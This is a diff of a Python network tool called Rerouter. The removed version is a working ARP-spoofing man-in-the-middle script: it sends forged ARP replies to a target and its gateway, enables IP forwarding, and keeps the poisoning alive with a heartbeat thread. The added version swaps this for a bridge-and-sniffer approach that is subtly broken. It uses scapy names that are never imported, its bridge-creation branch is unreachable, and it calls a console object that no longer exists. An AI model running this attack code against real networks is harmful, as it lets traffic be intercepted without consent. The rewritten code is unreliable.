@@ -1,363 +1,351 @@
 #!/usr/bin/python3
 
 
-import threading
+import scapy.all as scapy
+import netifaces
+import argparse
 import subprocess
+import threading
 import time
-import os
-import netifaces  # For network interface information
-import errno
-from scapy.all import *
-from rich.console import Console
-from rich.table import Table
-from rich.live import Live
-from rich.text import Text
 
 
 class Rerouter:
-    def __init__(self, target_ip, gateway_ip=None, interface=None, verbose=True):
+
+    def __init__(self, target_ip, interface=None, gateway_ip=None, verbose=True):
         self.target_ip = target_ip
-        self.gateway_ip = gateway_ip or self._get_default_gateway()
-        self.interface = interface or conf.iface  # Use scapy's default if none provided
-        self.target_mac = None
-        self.gateway_mac = None
         self.verbose = verbose
-        self.poison_threads = []
+        self.bridge_name = "br0"
         self.stop_event = threading.Event()
-        self.heartbeat_thread = None
-        self.console = Console()
-        self.max_retries = 3  # Maximum retries for heartbeat failures
-        self.retry_delay = 5  # Delay between retries in seconds
-        self.failed = False  # Flag to indicate if rerouting has failed
 
-        # Automatically determine gateway and interface if not provided
-        self.interface = interface or self._get_default_interface()
+        # Interface handling
+        if interface:  # An interface was provided
+            self.interface_name = interface
+            try:
+                self.interface = scapy.get_if_list()[
+                    scapy.get_if_list().index(self.interface_name)
+                ]
+            except ValueError as e:
+                self._print(
+                    f"The supplied interface {interface} was not found: {str(e)}",
+                    color="red",
+                )
+                raise
 
-        if (
-            not self.interface
-        ):  # Handle the case where no default interface can be found
-            self._print_error("No valid network interface found. Exiting.")
-            return  # Or raise an exception if that's more appropriate
+        else:  # No interface supplied
+            try:
+                default_gw = netifaces.gateways()[
+                    "default"
+                ]  # Get default gateway data from OS.
+                self.interface_name = default_gw[netifaces.AF_INET][
+                    1
+                ]  # Interface name is in the gateway data
+                self.interface = scapy.get_if_list()[
+                    scapy.get_if_list().index(self.interface_name)
+                ]
+                self._print(
+                    f"Using default interface: {self.interface_name}", color="green"
+                )  # Notify using default interface.
+            except (KeyError, IndexError, ValueError) as e:
+                self._print(
+                    f"Could not determine default interface: {str(e)}", color="red"
+                )
+                raise ValueError("No valid network interface found.")
 
-        self.gateway_ip = gateway_ip or self._get_default_gateway(self.interface)
+        # Gateway IP resolution
+        if gateway_ip:  # Use provided gateway if given
+            self.gateway_ip = gateway_ip
+        else:  # Resolve gateway IP if none provided.
+            try:
+                self.gateway_ip = netifaces.gateways()["default"][netifaces.AF_INET][0]
+                self._print(f"Using gateway IP: {self.gateway_ip}", color="green")
+            except (KeyError, IndexError) as e:
+                self._print(f"Could not get gateway IP: {str(e)}", color="red")
+                raise ValueError("Failed to determine default gateway")
 
-        if not self.gateway_ip:  # Handle potential error from _get_default_gateway
-            self._print_error("Could not determine default gateway. Exiting.")
-            return
-
-        self.target_mac = None
-        self.gateway_mac = None
-        self.poison_threads = []
-        self.heartbeat_thread = None
-
-        # Rich table setup (using dictionary for easier updates)
-        self.table_data = {
-            "Target IP": f"[bold blue]{self.target_ip}[/]",
-            "Gateway IP": f"[bold blue]{self.gateway_ip}[/]",
-            "Target MAC": "[bold yellow]Resolving...[/]",
-            "Gateway MAC": "[bold yellow]Resolving...[/]",
-            "Status": "[bold yellow]Initializing...[/]",
-            "IP Forwarding": "[bold yellow]Enabling...[/]",
-        }
-        self.live_table = Table(title="Rerouter Status", show_lines=True)
-        for key, value in self.table_data.items():
-            self.live_table.add_row(key, value)
-
-    def _get_default_interface(self):
-        """Gets the default network interface using netifaces."""
+        # Get Interface IP and MAC
         try:
-            gws = netifaces.gateways()
-            return gws["default"][netifaces.AF_INET][1]  # Returns interface name
-        except (KeyError, IndexError):
-            self._print_error("Error getting default interface")
+            self.interface_ip = netifaces.ifaddresses(self.interface_name)[
+                netifaces.AF_INET
+            ][0]["addr"]
+            self.interface_mac = netifaces.ifaddresses(self.interface_name)[
+                netifaces.AF_LINK
+            ][0]["addr"]
+
+            self._print(f"Interface IP: {self.interface_ip}", color="green")
+            self._print(f"Interface MAC: {self.interface_mac}", color="green")
+
+        except (KeyError, IndexError, ValueError) as e:
+            self._print(f"Could not get Interface IP or MAC: {str(e)}", color="red")
+            raise ValueError("Failed to determine default Interface IP or MAC")
+
+        # Get MAC addresses. (moved here, after interface and gateway resolution).
+        self.target_mac = self._get_mac(self.target_ip)
+        self.gateway_mac = self._get_mac(self.gateway_ip)
+
+        if not self.target_mac:
+            self._print(
+                f"Could not resolve target MAC for {self.target_ip}.", color="red"
+            )
+        if not self.gateway_mac:
+            self._print(
+                f"Could not resolve gateway MAC for {self.gateway_ip}.", color="red"
+            )
+
+    # Add a _get_mac method.
+    def _get_mac(self, ip):
+        try:
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+                timeout=2,
+                verbose=0,
+                iface=self.interface_name,
+            )
+            if ans:
+                return ans[0][1].hwsrc
+            return None
+        except Exception as e:
+            self._print(f"Error getting MAC: {e}", color="red")
             return None
 
-    def _get_default_gateway(self, interface):
-        """Gets the default gateway for the specified interface."""
-        try:
-            gws = netifaces.gateways()
-            return gws["default"][netifaces.AF_INET][0]
-        except (KeyError, IndexError):
-            self._print_error("Error getting default gateway")
-            return None
-
-    def _print_status(self, message):
+    def _print(self, msg, color="green"):
         if self.verbose:
-            self.console.print(f"[bold green][+][/] {message}")
+            print(f"[{color}]{msg}[/]")
 
-    def _print_error(self, message):
-        if self.verbose:
-            self.console.print(f"[bold red][!][/] {message}")
-
-    def _update_table(self, key, value):
-        for row in self.live_table.rows:
-            if row.cells[0].plain == key:
-                row.cells[1] = Text(value)
-                break  # Row updated, exit loop
-
-    def _poison_target(self):
+    def _setup_bridge(self):
+        """Creates and configures the bridge interface."""
         try:
-            while not self.stop_event.is_set():
-                packet = ARP(
-                    op=2,
-                    pdst=self.target_ip,
-                    hwdst=self.target_mac,
-                    psrc=self.gateway_ip,
-                )
-                send(packet, verbose=0, iface=self.interface)
-                time.sleep(2)
-        except OSError as ose:
-            self._print_error(f"Error in _poison_target: {ose}")
-            self._update_table("Status", f"[bold red]Error: {ose}[/]")
-            self.failed = True  # Set failed flag
-            self.stop_event.set()  # Stop other threads
-            raise  # Re-raise to be handled in start()
+            # Check if bridge already exists
+            subprocess.run(
+                ["ip", "link", "show", self.bridge_name],
+                capture_output=True,
+                check=False,
+            )
+        except subprocess.CalledProcessError as e:
+            if e.returncode == 1:  # Bridge doesn't exist, create it.
+                try:
+                    subprocess.run(
+                        ["ip", "link", "add", self.bridge_name, "type", "bridge"],
+                        check=True,
+                        capture_output=True,
+                        text=True,
+                    )
+                    self._print(f"Bridge interface {self.bridge_name} created.")
 
-    def _poison_gateway(self):
+                except subprocess.CalledProcessError as e:
+                    self._print(f"Error creating bridge: {e.stderr}", color="red")
+                    raise  # Re-raise
+            else:  # Some other error creating the bridge
+                raise  # Re-raise the original exception
+
         try:
-            while not self.stop_event.is_set():
-                packet = ARP(
-                    op=2,
-                    pdst=self.gateway_ip,
-                    hwdst=self.gateway_mac,
-                    psrc=self.target_ip,
-                )
-                send(packet, verbose=0, iface=self.interface)
-                time.sleep(2)
-        except OSError as ose:
-            self._print_error(f"Error in _poison_gateway: {ose}")
-            self._update_table("Status", f"[bold red]Error: {ose}[/]")
-            self.failed = True
-            self.stop_event.set()
-            raise  # Re-raise to be handled in start()
+            # Bring physical interface down
+            subprocess.run(
+                ["ip", "link", "set", self.interface_name, "down"],
+                check=True,
+                capture_output=True,
+                text=True,
+            )
+            self._print(f"Interface {self.interface_name} is down.")
 
-    def _heartbeat(self):
-        retries = 0
-        while not self.stop_event.is_set():
+            # Add physical interface to bridge
+            subprocess.run(
+                ["ip", "link", "set", self.interface_name, "master", self.bridge_name],
+                check=True,
+                capture_output=True,
+                text=True,
+            )
+            self._print(
+                f"Interface {self.interface_name} added to bridge {self.bridge_name}."
+            )
+
+            # Bring the bridge up
+            subprocess.run(
+                ["ip", "link", "set", self.bridge_name, "up"],
+                check=True,
+                capture_output=True,
+                text=True,
+            )
+            self._print(f"Bridge interface {self.bridge_name} is up.")
+
+        except subprocess.CalledProcessError as e:
+            self._print(f"Error setting up bridge: {e.stderr}", color="red")
+            raise  # Re-raise
+
+    def _remove_bridge(self):
+        try:
+            # Attempt to detach the interface, but don't stop if it fails
             try:
-                response = srp1(
-                    Ether(dst=self.target_mac) / ARP(pdst=self.target_ip),
-                    timeout=1,
-                    verbose=0,
-                    iface=self.interface,
+                subprocess.run(
+                    ["ip", "link", "set", self.interface_name, "master", "none"],
+                    check=True,
+                    capture_output=True,
+                    text=True,
                 )
-                if response and response.haslayer(ARP):
-                    if response[ARP].hwsrc != self.target_mac:
-                        self._print_error("Target MAC changed. Restarting...")
-                        self.restore()
-                        self.start()  # Restart the whole process
-                        return  # Exit heartbeat thread after restart
-                    retries = 0  # Reset retries on success
-                else:
-                    self._print_error("Target unreachable. Retrying...")
-                    retries += 1
-                    if retries >= self.max_retries:
-                        self._print_error("Max retries reached. Stopping.")
-                        self.failed = True
-                        self.stop_event.set()  # Stop poisoning
-                        break  # Exit the heartbeat loop after max retries
+                self._print(
+                    f"Interface {self.interface_name} detached from bridge.",
+                    color="green",
+                )  # Indicate success
+            except subprocess.CalledProcessError as detach_error:
+                self._print(
+                    f"Error detaching interface: {detach_error.stderr}", color="yellow"
+                )  # Report, but continue
 
-            except OSError as ose:
-                self._print_error(f"Heartbeat check failed: {ose}")
-                self._update_table("Status", f"[bold red]Error: {ose}[/]")
-                self.failed = True
-                self.stop_event.set()  # Stop other threads
-                break  # Heartbeat thread will end if stop_event is set
-            time.sleep(self.retry_delay)
+            # Always try to delete the bridge, even if detach failed.
+            subprocess.run(
+                ["ip", "link", "delete", self.bridge_name],
+                check=True,
+                capture_output=True,
+                text=True,
+            )
+            self._print(f"Bridge interface {self.bridge_name} removed.", color="green")
 
-    def _get_default_gateway(self):
+        except subprocess.CalledProcessError as remove_error:
+            self._print(
+                f"Error removing bridge: {remove_error.stderr}", color="red"
+            )  # Report removal errors.
+
+    def _forward_traffic(self):
         try:
-            gws = netifaces.gateways()
-            return gws["default"][netifaces.AF_INET][0]
-        except (KeyError, IndexError):
-            self._print_error("Could not determine default gateway.")
-            return None
 
-    def _get_mac(self, ip_address):
+            def _should_stop(packet):  # Custom stop filter function
+                return self.stop_event.is_set()
 
-        retries = 0
-        while retries < self.max_retries:  # Retry loop
-            try:
-                ans, _ = srp(
-                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),
-                    timeout=2,
-                    verbose=0,
-                    iface=self.interface,
-                )
-                if ans:
-                    return ans[0][1].hwsrc
-                else:
-                    self._print_error(f"No ARP response from {ip_address}. Retrying...")
-                    retries += 1
-                    time.sleep(self.retry_delay)
-            except OSError as ose:  # Handle socket errors
-                self._print_error(f"Error getting MAC of {ip_address}: {ose}")
-                retries += 1
-                time.sleep(self.retry_delay)
+            sniffer = scapy.AsyncSniffer(
+                filter=f"host {self.target_ip} and not (ether dst {scapy.get_if_hwaddr(self.interface_name)})",
+                prn=lambda x: scapy.send(x, iface=self.bridge_name),  # Forward packets
+                store=False,
+                iface=self.interface_name,  # Use interface name directly
+                stop_filter=_should_stop,  # Use the custom stop function
+            )
+            sniffer.start()  # Start sniffing asynchronously
 
-        return None  # Return None if MAC address cannot be found after retries
+            while not self.stop_event.is_set():  # Check the stop event periodically
+                time.sleep(0.1)  # Small delay to avoid busy-waiting.
 
-    def _enable_ip_forwarding(self):
-        try:
-            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
-            self._update_table("IP Forwarding", "[bold green]Enabled[/]")
-        except subprocess.CalledProcessError:
-            self._print_error("Failed to enable IP forwarding.")
+            sniffer.stop()  # Stop sniffing gracefully
 
-    def _disable_ip_forwarding(self):
-        try:
-            subprocess.check_call(["sysctl", "-w", "net.ipv4.ip_forward=0"])
-            self._update_table(
-                "IP Forwarding", "[bold red]Disabled[/]"
-            )  # Update Rich table
-        except subprocess.CalledProcessError:
-            self._print_error("Failed to disable IP forwarding.")
-
-    def _restore(self):
-        if self.target_mac and self.gateway_mac:  # Check if MACs were resolved
-            try:
-                send(
-                    ARP(
-                        op=2,
-                        pdst=self.gateway_ip,
-                        hwdst=self.gateway_mac,
-                        psrc=self.target_ip,
-                        hwsrc=self.target_mac,
-                    ),
-                    count=5,
-                    verbose=0,
-                    iface=self.interface,
-                )
-                send(
-                    ARP(
-                        op=2,
-                        pdst=self.target_ip,
-                        hwdst=self.target_mac,
-                        psrc=self.gateway_ip,
-                        hwsrc=self.gateway_mac,
-                    ),
-                    count=5,
-                    verbose=0,
-                    iface=self.interface,
-                )
-            except OSError as ose:
-                self._print_error(
-                    f"Error restoring ARP: {ose}"
-                )  # Correctly log the error
-
-    def restore(self):
-
-        self.stop_event.set()
-
-        for thread in self.poison_threads:
-            if thread:
-                thread.join()  # Make sure the threads actually exit
-
-        self.poison_threads = []  # Clear the thread list
-
-        restore_thread = threading.Thread(target=self._restore, daemon=True)
-        restore_thread.start()
-        restore_thread.join()  # Wait for restore to complete
-
-        if self.heartbeat_thread:
-            self.heartbeat_thread.join()
-
-        self._disable_ip_forwarding()  #  Put IP forwarding reset here to restore even if the threads have failed
-        self._update_table(
-            "Status", "[bold yellow]ARP Table Restored[/]"
-        )  # ARP Table restored after poisoning thread ends
-
-        if self.failed:
-            self._print_error(f"Rerouting failed due to previous error.")
-        else:
-            self._print_status("Rerouting stopped and ARP entries restored.")
+        except Exception as e:
+            self._print(f"Error forwarding traffic: {e}", color="red")
 
     def start(self):
-        with Live(self.live_table, refresh_per_second=4):  # Use "with Live(...)"
-            self._update_table(
-                "Status", "[bold yellow]Resolving MACs...[/]"
-            )  # Status is updated as the program is running
-            self._enable_ip_forwarding()
+        try:
+            self._setup_bridge()
 
-            self.target_mac = self._get_mac(self.target_ip)
-            self.gateway_mac = self._get_mac(self.gateway_ip)
-
-            self._update_table(
-                "Target MAC", f"[bold green]{self.target_mac}[/]"
-            )  # Update Target MAC
-            self._update_table(
-                "Gateway MAC", f"[bold green]{self.gateway_mac}[/]"
-            )  # Update Gateway MAC
-
-            if not self.target_mac or not self.gateway_mac:
-                self._print_error("Failed to resolve MAC addresses. Exiting.")
-                self._update_table(
-                    "Status", "[bold red]Failed: MAC Resolution[/]"
-                )  # Update Rich table status
-                self._disable_ip_forwarding()  # Disable IP forwarding on failure
-                return
-
-            poison_target_thread = threading.Thread(
-                target=self._poison_target, daemon=True
-            )
-            poison_gateway_thread = threading.Thread(
-                target=self._poison_gateway, daemon=True
-            )
-
-            self.poison_threads = [
-                poison_target_thread,
-                poison_gateway_thread,
-            ]  # Keep track of threads
-
-            poison_target_thread.start()
-            poison_gateway_thread.start()
-
-            self._update_table("Status", "[bold green]Active (Poisoning ARP)[/]")
-            self._print_status(f"Traffic from {self.target_ip} is now being rerouted!")
-
-            self.heartbeat_thread = threading.Thread(
-                target=self._heartbeat, daemon=True
-            )
-            self.heartbeat_thread.start()
-
-            # Keep the main thread alive to handle exceptions from other threads and to respond to stop signals
+            # Explicitly check if forwarding_thread was created before proceeding.
             try:
-                while True:
-                    if self.failed or self.stop_event.is_set():
-                        self.stop()
-                        break
-                    time.sleep(1)
-            except KeyboardInterrupt:
-                self.stop()
+                self.forwarding_thread = threading.Thread(
+                    target=self._forward_traffic, daemon=True
+                )
+                self.forwarding_thread.start()
+                self._print("Forwarding thread started.", color="green")
+            except Exception as thread_error:
+                self._print(
+                    f"Error starting forwarding thread: {thread_error}", color="red"
+                )
+                raise  # Re-raise to trigger the outer except block and attempt cleanup
 
-    def stop(self):  # stop method for console use and from within a program
+            self._print("Rerouting started.")
 
-        if self.heartbeat_thread and self.heartbeat_thread.is_alive():
-            self.stop_event.set()  # Use the stop_event here
-            self.heartbeat_thread.join()
+            while True:
+                if self.stop_event.is_set():
+                    self.stop()
+                    return  # Exit after calling stop()
 
-        self.restore()
+                time.sleep(1)
 
-        if self.failed:  # Exit with an error code if failed
-            exit(1)
+        except (
+            Exception
+        ) as e:  # Handle any errors during startup, including forwarding thread issues.
+            self._print(f"Error starting rerouting: {str(e)}", color="red")
+            self.stop()  # Attempt cleanup even if starting failed.
+
+    def stop(self):
+        self._print("Stopping rerouting...")
+        self.stop_event.set()
+
+        if hasattr(
+            self, "forwarding_thread"
+        ):  # Only try to join if forwarding thread has been started
+            try:
+                self.forwarding_thread.join(timeout=2.0)
+                if self.forwarding_thread.is_alive():
+                    self._print(
+                        "Forwarding thread did not exit within timeout.", color="yellow"
+                    )
+                else:
+                    self._print(
+                        f"Forwarding thread exited normally: {self.forwarding_thread.name}",
+                        color="green",
+                    )  # Show thread name
+
+            except Exception as removal_error:
+                self._print(
+                    f"Error joining forwarding thread: {str(removal_error)}",
+                    color="red",
+                )  # Print specific exception
+
+        try:
+            self._remove_bridge()
+        except Exception as removal_error:
+            self._print(
+                f"Encountered an issue removing the bridge: {str(removal_error)}\n",
+                color="red",
+            )
+
+        # After attempting bridge removal try and bring the interface back up.
+        try:
+            subprocess.run(
+                ["ip", "link", "set", self.interface_name, "up"],
+                check=True,
+                capture_output=True,
+                text=True,
+            )  # Bring interface back up
+            self._print(f"Interface {self.interface_name} set to up.", color="green")
+        except subprocess.SubprocessError as iface_error:
+            self._print(
+                f"Error setting up interface {self.interface_name} during stop(): {str(iface_error)}",
+                color="red",
+            )
+            if self.verbose:
+                self.console.print_exception()  # Print exception if verbose is enabled.
+
+        self._print("Rerouting stopped.")
 
 
 if __name__ == "__main__":
-    import argparse
-
-    parser = argparse.ArgumentParser(description="Reroute traffic from a target IP.")
+    parser = argparse.ArgumentParser(
+        description="Reroutes network traffic for a target IP."
+    )
     parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("gateway_ip", nargs="?", help="Gateway IP address (optional)")
     parser.add_argument("-i", "--interface", help="Network interface (optional)")
+    parser.add_argument(
+        "-g",
+        "--gateway",
+        dest="gateway_ip",
+        help="Gateway IP address (optional)",  # Correctly get gateway IP
+    )
+    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     args = parser.parse_args()
 
-    rerouter = Rerouter(args.target_ip, args.gateway_ip, args.interface)
     try:
+        rerouter = Rerouter(
+            args.target_ip, args.interface, args.gateway_ip, args.verbose
+        )  # Pass gateway_ip correctly
         rerouter.start()
+        while True:
+            time.sleep(1)
 
+    except ValueError as ve:  # More specific error catching:
+        print(f"[bold red]{ve}[/]")  # Print the ValueError message
+        parser.print_help()  # Show help
+        exit(1)  # Indicate error
     except KeyboardInterrupt:
         print("Stopping...")
-        rerouter.stop()
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")  # Handle all exceptions
-        rerouter.stop()
+        if (
+            "rerouter" in locals()
+        ):  # Check if rerouter instance was created successfully
+            rerouter.stop()  # If so call .stop() method
+    except Exception as e:  # Catch-all for any other exceptions:
+        print(f"An unexpected error occurred: {str(e)}")  # Show error
+        if "rerouter" in locals():  # Check if we can call stop
+            rerouter.stop()  # Attempt to clean up
